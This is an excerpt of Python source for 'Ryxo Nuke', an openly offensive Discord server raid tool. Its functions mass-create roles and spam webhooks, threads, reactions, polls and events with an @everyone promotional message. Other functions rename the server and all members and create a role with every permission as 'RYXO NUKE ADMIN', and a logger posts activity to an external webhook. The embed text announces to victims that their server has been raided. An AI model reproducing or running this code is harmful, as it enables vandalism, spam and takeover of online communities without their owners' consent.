...
TELEGRAM_URL = "https://t.me/RyxoStudio"
TELEGRAM_TAG = "t.me/RyxoStudio"
DISCORD_URL  = "https://discord.gg/sFachfGYdB"
DISCORD_TAG  = "discord.gg/sFachfGYdB"
GITHUB_URL   = "https://github.com/itzsepanta/RyxoNuke"
PUB          = f"||@everyone||  **# RAID BY RYXO NUKE**  :  {TELEGRAM_TAG} · {DISCORD_TAG}  <{GITHUB_URL}>"
PUB_SHORT    = f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/itzsepanta"
RAID_NAME   = "raid-by-ryxo"
TOOL_NAME   = "Ryxo Nuke"
...
EMBED_CONFIG = {
    "title"      : "\U0001f480  __Ryxo Nuke__",
    "description": (
        "**Ton serveur vient d'\u00eatre raid par Ryxo Nuke.**\n\n"
        "_ _\n"
        f"**> {TELEGRAM_TAG}**\n"
        f"**> {DISCORD_TAG}**\n"
        "**> github.com/itzsepanta**\n"
        "_ _\n"
        "||@everyone||"
    ),
    "color"      : 0xFF0000,
    ...
    "fields"     : [
        ...
        {"name": "\u26a1 __Tool__",        "value": "**Ryxo Nuke v26.1.0**",       "inline": True},
    ],
}

WEBHOOK_CONFIG = {"default_name": "Ryxo Nuke"}
SERVER_CONFIG  = {
    "new_name"       : "RAIDED BY RYXO NUKE",
    "new_icon"       : "",
...
def _open_star_unlock():
    ...
    log_info("github.com/itzsepanta/RyxoNuke")
    try:
...
def _print_menu(page: int = 1):
    ...
    print(f"\n  {R3}Ryxo Nuke v26.1.0{RS}  {DIM}Discord: feeraj{RS}")
...
async def nuke(sid):
    ...
    async def _make_role():
        try:
            ...
            await g.create_role(name="Ryxo Nuke", colour=col); return True
        except: return False
    rr2 = await asyncio.gather(*[_make_role() for _ in range(50)])
    log_ok(f"{rr2.count(True)} roles Ryxo Nuke created")
    fx_load("webhook spam", 22, .014)
    async def _raid_chan(chan):
        try:
            wh = await chan.create_webhook(name="RYXO NUKE TOOLS")
            for _ in range(5):
                try: await wh.send(content=PUB, username="RYXO NUKE TOOLS")
                except: pass
            try: await wh.delete()
            except: pass
...
async def auto_raid(sid):
    ...
    log_ok("50 roles Ryxo Nuke created")
...
async def thread_spam(sid):
    ...
    name = _ask("thread name  [enter = pub]") or f"Ryxo Nuke | {DISCORD_TAG}"
...
async def reaction_spam(sid):
    ...
    ryxo_emojis = ["\U0001f1fb","\U0001f1f4","\U0001f1ee","\U0001f1e9","\U0001f300","\U0001f4ab","\U0001f573","\U0001f533","\U0001f517"]
    fx_load("loading", 14, .018)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            async for msg in chan.history(limit=limit):
                for emoji in ryxo_emojis:
...
async def poll_spam(sid):
    ...
    question = _ask("question  [enter = pub]") or f"Join Ryxo Nuke  |  {PUB_SHORT}"
...
async def event_spam(sid):
    ...
    name = _ask("event name  [enter = pub]") or "RYXO NUKE TOOLS"
    desc = _ask("description [enter = pub]") or f"**RAIDED BY RYXO NUKE**\n{PUB_SHORT}"
...
async def nick_all(sid):
    ...
    nick = _ask("nickname  [enter = pub]") or f"Ryxo | {PUB_SHORT}"
    nv   = nick[:32] or None
...
async def create_roles(sid):
    ...
    name = _ask("role name  [enter = pub]") or "Ryxo Nuke"
...
async def get_admin(sid):
    ...
    try:
        ...
        role = await g.create_role(name="RYXO NUKE ADMIN", colour=col, permissions=discord.Permissions.all())
...
async def rename_all_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME ROLES"); name = _ask("new name  [enter = pub]") or "Ryxo Nuke"
...
async def category_creator(sid):
    ...
    name = _ask("name  [enter = pub]") or "Ryxo Nuke"
    fx_load("creating", 16, .020)
    t = time.perf_counter(); ok=fail=0
    for i in range(count):
...
async def dehoist_all(sid):
    ...
    for m in g.members:
        ...
        if n and n[0] in special:
            clean = n.lstrip("".join(special)) or "ryxo"
...
async def _dispatch_log(entry: str):
    ...
    try:
        payload = json.dumps({"content": entry[:1990], "username": "ryxo-logger"})
        async with aiohttp.ClientSession() as session:
...
async def webhook_logger(sid):
    ...
    await _dispatch_log(f"\u2705 **Ryxo Nuke Logger activ\u00e9** on `{g.name}`")
...
def _boot():
    ...
    fx_load("initializing Ryxo Nuke v26.1.0", 24, .016)
    print()
    _flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".ryxo_first")
